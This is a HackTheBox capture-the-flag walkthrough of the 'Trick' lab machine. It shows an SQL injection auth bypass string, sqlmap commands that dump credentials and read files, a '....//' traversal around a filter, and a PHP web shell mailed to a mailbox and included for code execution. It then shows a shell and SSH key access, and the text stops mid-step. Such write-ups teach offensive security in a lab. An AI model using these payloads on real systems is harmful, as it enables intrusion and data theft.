---
title: HTB: Trick
url: https://0xdf.gitlab.io/2022/10/29/htb-trick.html
date: 2022-10-29T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-trick, ctf, hackthebox, nmap, smtp, smtp-user-enum, zone-transfer, vhosts, wfuzz, feroxbuster, employee-management-system, sqli, sqli-bypass, cve-2022-28468, boolean-based-sqli, sqlmap, file-read, lfi, directory-traversal, mail-poisoning, log-poisoning, burp, burp-repeater, fail2ban, htb-admirertoo, cpts-like
---

![Trick](https://0xdfimages.gitlab.io/img/trick-cover.png)

Trick starts with some enumeration to find a virtual host. There’s an SQL injection that allows bypassing the authentication, and reading files from the system. That file read leads to another subdomain, which has a file include. I’ll show how to use that LFI to get execution via mail poisoning, log poisoning, and just reading an SSH key. To escalate to root, I’ll abuse fail2ban.

## Box Info

| Name | [Trick](https://hackthebox.com/machines/trick)  [Trick](https://hackthebox.com/machines/trick) [Play on HackTheBox](https://hackthebox.com/machines/trick) |
| --- | --- |
| Release Date | [18 Jun 2022](https://twitter.com/hackthebox_eu/status/1541792286169862144) |
| Retire Date | 29 Oct 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Trick |
| Radar Graph | Radar chart for Trick |
| First Blood User | 00:31:08[0xCaue 0xCaue](https://app.hackthebox.com/users/270601) |
| First Blood Root | 00:56:24[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [Geiseric Geiseric](https://app.hackthebox.com/users/184611) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.166
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-14 20:14 UTC
Nmap scan report for 10.10.11.166
Host is up (0.091s latency).
Not shown: 65531 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds
oxdf@hacky$ nmap -p 22,25,53,80 -sCV 10.10.11.166
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-14 20:14 UTC
Nmap scan report for 10.10.11.166
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.77 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running .

### SMTP - TCP 25

There’s not a ton I can do with SMTP at this point. One possibility it to brute force a bunch of user names and potentially see if any exist. There’s an `nmap` script that will attempt this:

```

oxdf@hacky$ nmap -p 25 --script=smtp-enum-users 10.10.11.166
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-15 10:29 UTC
Nmap scan report for trick.htb (10.10.11.166)
Host is up (0.088s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|_  Method RCPT returned a unhandled status code.

Nmap done: 1 IP address (1 host up) scanned in 11.19 seconds

```

It seems to be failing using the RCPT method. This can be done manually using `telnet`:

```

oxdf@hacky$ telnet 10.10.11.166 25
Trying 10.10.11.166...
Connected to 10.10.11.166.
Escape character is '^]'.
220 debian.localdomain ESMTP Postfix (Debian/GNU)
VRFY root
252 2.0.0 root
VRFY 0xdf
550 5.1.1 <0xdf>: Recipient address rejected: User unknown in local recipient table

```

I’ve confirmed that root is a user on the box, and 0xdf is not.

The `smtp-user-enum` [script](https://github.com/cytopia/smtp-user-enum) will automate these checks:

```

oxdf@hacky$ smtp-user-enum -m VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.txt 10.10.11.166 25
Connecting to 10.10.11.166 25 ...
220 debian.localdomain ESMTP Postfix (Debian/GNU)
250 debian.localdomain
Start enumerating users with VRFY mode ...
[----] !root                      501 5.1.3 Bad recipient address syntax
[----] $ALOC$                     550 5.1.1 <$ALOC$>: Recipient address rejected: User unknown in local recipient table
[----] $SRV                       550 5.1.1 <$SRV>: Recipient address rejected: User unknown in local recipient table
[----] $system                    550 5.1.1 <$system>: Recipient address rejected: User unknown in local recipient table
[----] (NULL)                     501 5.1.3 Bad recipient address syntax
[----] (any)                      501 5.1.3 Bad recipient address syntax
[----] (created)                  501 5.1.3 Bad recipient address syntax
[----] 1                          550 5.1.1 <1>: Recipient address rejected: User unknown in local recipient table
[----] 11111111                   550 5.1.1 <11111111>: Recipient address rejected: User unknown in local recipient table
...[snip]...

```

I’ll run this in the background while I enumerate elsewhere. `smtp-user-enum` doesn’t give any kind of summary for only found users, so I’ll have to look at the response codes. `cirl-default-usernames` finds a few, all common Linux service users:

```

[----] BACKUP                     252 2.0.0 BACKUP
[----] MAIL                       252 2.0.0 MAIL
[----] NEWS                       252 2.0.0 NEWS
[----] POSTMASTER                 252 2.0.0 POSTMASTER
[----] ROOT                       252 2.0.0 ROOT
[----] SYS                        252 2.0.0 SYS
[----] bin                        252 2.0.0 bin
[----] daemon                     252 2.0.0 daemon
[----] games                      252 2.0.0 games
[----] lp                         252 2.0.0 lp          
[----] mail                       252 2.0.0 mail
[----] man                        252 2.0.0 man
[----] news                       252 2.0.0 news          
[----] nobody                     252 2.0.0 nobody
[----] root                       252 2.0.0 root
[----] root                       252 2.0.0 root
[----] root@localhost             252 2.0.0 root@localhost  
[----] sync                       252 2.0.0 sync
[----] sys                        252 2.0.0 sys 
[----] uucp                       252 2.0.0 uucp

```

### DNS - TCP 53 / UDP 53

#### Lookups

With DNS, I can take a guess at a domain name like `trick.htb`, and see that it does resolve:

```

oxdf@hacky$ dig +noall +answer @10.10.11.166 trick.htb
trick.htb.              604800  IN      A       127.0.0.1

```

I like to use `+noall +answer` to get rid of a bunch of useless output from `dig`, but those aren’t necessary.

#### Reverse Lookup

If I didn’t want to guess at the domain, a reverse lookup will also show the domain name:

```

oxdf@hacky$ dig +noall +answer @10.10.11.166 -x 10.10.11.166
166.11.10.10.in-addr.arpa. 604800 IN    PTR     trick.htb.

```

#### Zone Transfer

TCP 53 is not seen on DNS servers as often (except for Windows DCs). One of the main reasons to use TCP is to do a zone transfer, asking the DNS server for all the records related to a given “zone” (such as `trick.htb`). To do a zone transfer, I’ll give `dig` the `axfr` options:

```

oxdf@hacky$ dig +noall +answer @10.10.11.166 axfr trick.htb
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800

```

In addition to `trick.htb`, there’s `preprod-payroll.trick.htb`!

### Fuzz for Subdomains

To look for any additional subdomains, I’ll use `wfuzz` to request the webpage, each time with a different `Host` header, and see if anything different comes back. I’ll start like this without filtering:

```

oxdf@hacky$ wfuzz -u http://10.10.11.166 -H "Host: FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.166/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000001:   200        83 L     475 W    5480 Ch     "www"
000000002:   200        83 L     475 W    5480 Ch     "mail"
000000004:   200        83 L     475 W    5480 Ch     "localhost"
000000003:   200        83 L     475 W    5480 Ch     "ftp"
000000005:   200        83 L     475 W    5480 Ch     "webmail"
000000006:   200        83 L     475 W    5480 Ch     "smtp"
000000007:   200        83 L     475 W    5480 Ch     "webdisk"
000000008:   200        83 L     475 W    5480 Ch     "pop"
000000009:   200        83 L     475 W    5480 Ch     "cpanel"
000000010:   200        83 L     475 W    5480 Ch     "whm"
000000011:   200        83 L     475 W    5480 Ch     "ns1"
000000012:   200        83 L     475 W    5480 Ch     "ns2"
000000013:   200        83 L     475 W    5480 Ch     "autodiscover"
000000014:   200        83 L     475 W    5480 Ch     "autoconfig"
000000015:   200        83 L     475 W    5480 Ch     "ns"
000000016:   200        83 L     475 W    5480 Ch     "test"
000000017:   200        83 L     475 W    5480 Ch     "m"
000000018:   200        83 L     475 W    5480 Ch     "blog"
000000019:   200        83 L     475 W    5480 Ch     "dev"
000000020:   200        83 L     475 W    5480 Ch     "www2"
000000021:   200        83 L     475 W    5480 Ch     "ns3"
000000022:   200        83 L     475 W    5480 Ch     "pop3"
000000023:   200        83 L     475 W    5480 Ch     "forum"
^C
Finishing pending requests...

```

The default response is 5480 characters, so I’ll add `--hh 5480` to the command to filter those:

```

oxdf@hacky$ wfuzz -u http://10.10.11.166 -H "Host: FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 5480
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.166/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

Total time: 44.50913
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 112.0893

```

It doesn’t find anything.

### trick.htb - TCP 80

#### Site

Visiting by IP or by `trick.htb`, the website is just a coming soon page:

![image-20221014161903030](https://0xdfimages.gitlab.io/img/image-20221014161903030.png)

Putting an email into the form doesn’t do anything.

#### Tech Stack

The HTTP response headers don’t give any additional information:

```

HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Fri, 14 Oct 2022 20:18:44 GMT
Content-Type: text/html
Last-Modified: Wed, 23 Mar 2022 16:34:04 GMT
Connection: close
ETag: W/"623b4bfc-1568"
Content-Length: 5480

```

The server is NGINX. Guessing at the index page file extension, the page loads as `index.html`, which suggests a static site.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://trick.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://trick.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       83l      475w     5480c http://trick.htb/
301      GET        7l       12w      185c http://trick.htb/css => http://trick.htb/css/
301      GET        7l       12w      185c http://trick.htb/js => http://trick.htb/js/
301      GET        7l       12w      185c http://trick.htb/assets => http://trick.htb/assets/
301      GET        7l       12w      185c http://trick.htb/assets/img => http://trick.htb/assets/img/
[####################] - 54s   180000/180000  0s      found:5       errors:0      
[####################] - 53s    30000/30000   560/s   http://trick.htb 
[####################] - 53s    30000/30000   560/s   http://trick.htb/ 
[####################] - 53s    30000/30000   562/s   http://trick.htb/css 
[####################] - 53s    30000/30000   560/s   http://trick.htb/js 
[####################] - 53s    30000/30000   561/s   http://trick.htb/assets 
[####################] - 53s    30000/30000   561/s   http://trick.htb/assets/img 

```

Nothing interesting here.

### preprod-payroll.trick.htb

#### Site

This site shows a login form:

![image-20221014170147481](https://0xdfimages.gitlab.io/img/image-20221014170147481.png)

The page title is “Employee’s Payroll Management System”:

![image-20221014170233228](https://0xdfimages.gitlab.io/img/image-20221014170233228.png)

#### Identify Software

Despite the look of the page, this is actually real software. Googling for the full string in quotes returns a bunch of real pages with the same title:

![image-20221014170612050](https://0xdfimages.gitlab.io/img/image-20221014170612050.png)

This is a software called “Payroll Management System” from [Sourcecodetester](https://www.sourcecodester.com/php/14475/payroll-management-system-using-phpmysql-source-code.html).

I’m going to skip the directory brute force for now, as I can always just grab the source if I want / need it.

## Shell as michael

### SQL Injection

#### Identify SQLI

On my first attempt at Trick, I just assumed that the `preprod-payroll` page was a custom development for HTB, without realizing it was real software. I’ll show my path without using the source, though it is available if I need it.

Trying a simple SQL injection auth bypass like a username of “0xdf’ or 1=1;–” works and I am logged in!

![image-20221014172719494](https://0xdfimages.gitlab.io/img/image-20221014172719494.png)

That’s because the site is making an SQL query that looks something like:

```

select username from users where username = '[input user]' and password = '[input password]';

```

It may be hashing the password before the comparison, but it’s the same idea either way.

When I send “0xdf’ or 1=1;– -“, the resulting query looks like:

```

select username from users where username = '0xdf' or 1=1;-- -' and password = 'password';

```

That’s going to return all the users, and then the code thinks I have the right password and allows access to the site.

This is actually a CVE in this software, CVE-2022-28468.

#### Site Enumeration

This code is absolutely riddled with vulnerabilities, and it’s not worth the page space to spend time going through all of them, especially those that don’t lead to progress on the box. But it is good practice to see what you can find. A favorite of mine is in the edit user dialog:

![image-20221027063936988](https://0xdfimages.gitlab.io/img/image-20221027063936988.png)

The typical thing to do would be to leave the existing password field blank, or put some dummy number of dots there to fill the space. But this site is actually pre-filling this field with the actual password from the database. This can be seen in the dev tools:

![image-20221027064102739](https://0xdfimages.gitlab.io/img/image-20221027064102739.png)

Not only is it leaking the password, but this means the application is storing the password in plaintext in the DB.

#### SQL Manual Enumeration

Beyond just an auth bypass, I’ll look to fetch information using the SQL injection. I’ll find a request in Burp history where I tried to log in with something like “admin” / “admin”, right click on that request, and select “Send to Repeater”.

The best kind of SQLI is when something from the DB is output back onto the page. Unfortunately, I don’t have that here. But I can check for a boolean injection. I’ll update my username to something with a true in it, and see that result is “1”:

![image-20221014173543383](https://0xdfimages.gitlab.io/img/image-20221014173543383.png)

When I set that `1=1` to something false, the result is different:

![image-20221014173619711](https://0xdfimages.gitlab.io/img/image-20221014173619711.png)

That means I can put more complicated queries in in place of the `1=1` and get yes/no answers.

#### Identify Injection in sqlmap

Actually getting data out of a blind boolean injection takes a lot of brute forcing, and `sqlmap` is the tool to do that. I’ll find a request in Burp history where I tried to log in with something like “admin” / “admin”, right click on that request, and select “Copy to file”, saving it as `login.req`.

Running `sqlmap` with this request finds only a time-based injection:

```

oxdf@hacky$ sqlmap -r login.req --batch
...[snip]...
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 210 HTTP(s) requests:
---                                                                                                                     
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7458 FROM (SELECT(SLEEP(5)))rnYG) AND 'xsoH'='xsoH&password=admin
---  
...[snip]...

```

Time-based is really slow, and I know there’s a boolean-based one. I’ll specify the technique and up the level and it finds it:

```

oxdf@hacky$ sqlmap -r login.req --batch --technique B --level 5
...[snip]...
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 137 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 1086=(SELECT (CASE WHEN (1086=1086) THEN 1086 ELSE (SELECT 9128 UNION SELECT 2646) END))-- -&password=admin
---
...[snip]...

```

#### Enumerate with sqlmap

Now that `sqlmap` has found the vulnerability, I can task it for more information. For example, the current user of the DB:

```

oxdf@hacky$ sqlmap -r login.req --batch --threads 10 --current-user
...[snip]...
current user: 'remo@localhost'
...[snip]...

```

I’m using threads to speed up the process. Threads are safe with boolean, but not time-based.

There are two databases, though one is the default for MySQL:

```

oxdf@hacky$ sqlmap -r login.req --batch --threads 10 --current-user
...[snip]...
available databases [2]:
[*] information_schema
[*] payroll_db
...[snip]...

```

There are 11 tables:

```

oxdf@hacky$ sqlmap -r login.req --batch --threads 10 -D payroll_db --tables
...[snip]...
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+
...[snip]...

```

I’ll dump the `users` table:

```

oxdf@hacky$ sqlmap -r login.req --batch --threads 10 -D payroll_db -T users --dump
...[snip]...
Database: payroll_db
Table: users
[1 entry]
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type | address | contact | password              | username   |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
...[snip]...

```

One user, with username Enemigosss, and password “SuperGucciRainbowCake”. I’ll note these both.

#### File Read with sqlmap

SQL can be configured such that I can read files through the injection. `sqlmap` allows this with the `--file-read` parameter. It works:

```

oxdf@hacky$ sqlmap -r login.req --batch --threads 10 --file-read=/etc/hostname
...[snip]...
[*] /home/oxdf/.sqlmap/output/preprod-payroll.trick.htb/files/_etc_hostname (same file)
...[snip]...
oxdf@hacky$ cat /home/oxdf/.sqlmap/output/preprod-payroll.trick.htb/files/_etc_hostname 
trick

```

I’ll read the `/etc/passwd` file the same way. It takes a few minutes, but it comes back. I’ll look for users that have a shell set (removing the machine accounts), and see a couple:

```

oxdf@hacky$ cat /home/oxdf/.sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash

```

### Find Marketing Subdomain

#### Via SQL Injection

The intended path for this box is to use the SQL injection file read to get the NGINX config. I know it’s NGINX from the initial enumeration. The default config file would be at `/etc/nginx/sites-enabled/default`. I’ll pull that file with `sqlmap`, and it returns information about three virtual hosts (vhosts).

The first is for `trick.htb`, and it’s the default server, which is why visiting by IP leads there as well:

```

server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name trick.htb;
        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}

```

The third one is `preprod-payroll.trick.htb`:

```

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}

```

Between them is a new one, `preprod-marketing.trick.htb`:

```

server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

```

It’s worth noting that the `fastcgi_pass` for the new site is different, using `php7.3-fpm-michael.sock` to handle PHP files. That hints that this site may be running as a different user than the others.

#### Via Fuzzing

I fuzzed for subdomains [above](#fuzz-for-subdomains) using a common wordlist. Given the interesting structure of `preprod-payroll.trick.htb`, I might want to check for other `preprod-` subdomains. I’ll run the same command as above, with a tweak to the `Host` header:

```

oxdf@hacky$ wfuzz -u http://10.10.11.166 -H "Host: preprod-FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 5480
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.166/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000254:   200        178 L    631 W    9660 Ch     "marketing"

Total time: 44.51130
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 112.0838

```

This time it finds the `preprod-marketing` subdomain. With this approach, I could skip the SQL injection entirely.

### LFI as michael

#### Marketing Site

The marketing site is mostly junk text:

[![image-20221015060448716](https://0xdfimages.gitlab.io/img/image-20221015060448716.png)](https://0xdfimages.gitlab.io/img/image-20221015060448716.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20221015060448716.png)

There are a few other pages (“Services”, “About”, “Contact”), but their content is also junk. However, the URL scheme is interesting. Clicking the “Services” link leads to `http://preprod-marketing.trick.htb/index.php?page=contact.html`. It is common on PHP sites to have a main `index.php` that handles the overall theme, menu bars, etc, and then includes the target page in it.

Visiting `http://preprod-marketing.trick.htb/contact.html` loads the same page, suggesting that the static HTML page is in the same directory, and being loaded by the `page` parameter.

#### Directory Traversal [Fail]

One way to attack this kind of include is to look for a directory traversal vulnerability. Trying to load a file outside the web directory (`/etc/passwd` is a common file to use, as it’s world readable and always in the same place) fails using both a absolute path (`http://preprod-marketing.trick.htb/index.php?page=/etc/passwd`) and a relative one (`http://preprod-marketing.trick.htb/index.php?page=../../../../../../../../../etc/passwd`). Both just return an empty page.

The site must be filtering the input somehow.

#### Read index.php Source

Another way to try to abuse a file include is to read the PHP source of the site. Just including `index.php` in something like `http://preprod-marketing.trick.htb/index.php?page=index.php`, as `index.php` will be executed again, rather than returning the source.

One way to try to get the source is using a PHP filter. Visiting `http://preprod-marketing.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=index.php` could base64 encode `index.php` before it’s included, and then just the base64 text would appear. Unfortunately, this fails and returns an empty page.

At this point I’ll go back to the SQL injection. I’ve got the full path to the site from the NGINX config. I’ll read it with `sqlmap` and `--file-read=/var/www/market/index.php`.

```

<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
        include("/var/www/market/".str_replace("../","",$file));
}
?>

```

I can now explain why all previous attempts failed.
- The directory traversal with an absolute path failed because the input was prepended with `/var/www/market/`, making it `/var/www/market//etc/passwd`, which doesn’t exist.
- The directory traversal with a relative path failed because of the `str_replace` call, which removed all the `../`, leaving `/var/ww/market/etc/passwd`.
- The PHP filter failed because of the prepend as well. In that case, it tried to include `/var/www/market/php://filter/convert.base64-encode/resource=index.php`.

It also makes sense why having `page=index.php` just showed the normal page. It loads `index.php` again, and this time `$file` won’t be set, so it just loads `home.html`.

#### Directory Traversal

Even without the source, this kind of `str_replace` to remove `../` is a common and insecure way to try to prevent local file inclusions / directory traversal vulnerabilities. The problem is that `str_replace` only applies one. That means if I put a bunch of `....//` in the string, when it removes `../`, that leaves `../`. For example:

![image-20221015062733120](https://0xdfimages.gitlab.io/img/image-20221015062733120.png)

### Shell Via Mail Include

#### Read Mail

The intended path for this machine is to take advantage of port 25. I know that michael is a user on the box. It’s in the `/etc/passwd` file. I can validate this one name with `smtp-user-enum` as well:

```

oxdf@hacky$ smtp-user-enum -m VRFY -u michael 10.10.11.166 25
Connecting to 10.10.11.166 25 ...
220 debian.localdomain ESMTP Postfix (Debian/GNU)
250 debian.localdomain
Start enumerating users with VRFY mode ...
[----] michael 252 2.0.0 michael

```

michael’s mail will be stored at `/var/mail/michael`. It comes back empty on a file include.

I’ll send mail to the account using `swaks`:

```

oxdf@hacky$ swaks --to michael --from 0xdf --header "Subject: Testing!" --body "ignore this message" --server 10.10.11.166
=== Trying 10.10.11.166:25...
=== Connected to 10.10.11.166.
<-  220 debian.localdomain ESMTP Postfix (Debian/GNU)
 -> EHLO hacky
<-  250-debian.localdomain
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<0xdf>
<-  250 2.1.0 Ok
 -> RCPT TO:<michael>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Sat, 15 Oct 2022 10:46:03 +0000
 -> To: michael
 -> From: 0xdf
 -> Subject: Testing!
 -> Message-Id: <20221015104603.525294@hacky>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> ignore this message
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 836FB4099C
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.

```

The email is there at `http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael`:

![image-20221015064830865](https://0xdfimages.gitlab.io/img/image-20221015064830865.png)

#### Include PHP

Because the `page` parameter is being included with the `include` keyword, that means any PHP in it will be run. I’ll resend the email, this time with `--body '<?php system($_REQUEST["cmd"]); ?>"`.

Now I’ll add `&cmd=id` to the end of the URL and refresh:

![image-20221015065240733](https://0xdfimages.gitlab.io/img/image-20221015065240733.png)

That’s code execution!

It’s worth noting that `/var/mail/michael` seems to be cleared every two minutes. This makes sense both so that players don’t see each other’s exploits, and so that if someone puts bad PHP into that file, they don’t have to reset the box. Still, it can be a pain, and I’ll likely have to send the email many times.

#### Shell

I’ll update my payload to a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw). If I put this into Firefox, I only need to URL encode the `&` (or else it will read that as ending the parameter and starting a new one):

![image-20221015070227743](https://0xdfimages.gitlab.io/img/image-20221015070227743.png)

This hangs, but at my listening `nc`, there’s a shell as michael:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.166 48976
bash: cannot set terminal process group (721): Inappropriate ioctl for device
bash: no job control in this shell
michael@trick:/var/www/market$

```

I’ll upgrade it using the `script` / `stty` [technique](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

michael@trick:/var/www/market$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
michael@trick:/var/www/market$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ;fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
michael@trick:/var/www/market$ 

```

I can also access `user.txt`:

```

michael@trick:~$ cat user.txt
520a7434************************

```

#### SSH

There’s also a SSH key pair in michael’s `.ssh` directory:

```

michael@trick:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub

```

`id_rsa` is the private key, and `id_rsa.pub` is the public key. The `authorized_keys` file is also important. This is the default file that `sshd` (the SSH server) looks at for a list of public keys that can authenticate as michael.

The `id_rsa.pub` is in `authorized_keys`:

```

michael@trick:~/.ssh$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAj1gsVEpPokVNKo+3b/7uaCDkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizEhkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1LjnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryx michael@trick
michael@trick:~/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAj1gsVEpPokVNKo+3b/7uaCDkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizEhkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1LjnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryx michael@trick

```

With access to the private key with the same name, I can use this to authenticate to Trick as michael.

I’ll copy the contents of the private key and paste them into a file on my system. Now I can give `ssh` the `-i` flag to point to that file when authenticating:

```

oxdf@hacky$ ssh -i ~/keys/trick-michael michael@trick.htb
Warning: Permanently added 'trick.htb' (ECDSA) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for '/home/oxdf/keys/trick-michael' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "/home/oxdf/keys/trick-michael": bad permissions
michael@trick.htb's password:

```

It fails here because the pemissions on the private key are too open (664, which means everyone on my system can read it). I’ll fix that, and then it works:

```

